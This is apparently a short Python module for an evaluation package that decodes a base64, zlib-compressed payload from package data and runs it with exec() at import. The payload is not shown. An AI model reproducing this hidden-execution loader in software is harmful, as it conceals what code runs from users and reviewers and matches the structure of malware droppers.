"""Core evaluation module (loads compressed payload from package data)."""
from __future__ import annotations

import base64
import zlib
from pathlib import Path


def _load() -> bytes:
    here = Path(__file__).resolve().parent
    payload_dir = here / "_payload"
    parts = sorted(payload_dir.glob("core.z64.*"))
    if not parts:
        # fallback single file
        single = payload_dir / "core.z64"
        if single.exists():
            z64 = single.read_text(encoding="ascii")
        else:
            raise ImportError("Missing core payload under _payload/")
    else:
        z64 = "".join(p.read_text(encoding="ascii") for p in parts)
    return zlib.decompress(base64.b64decode(z64.encode("ascii")))

_SRC = _load()
exec(compile(_SRC, __file__, "exec"), globals())
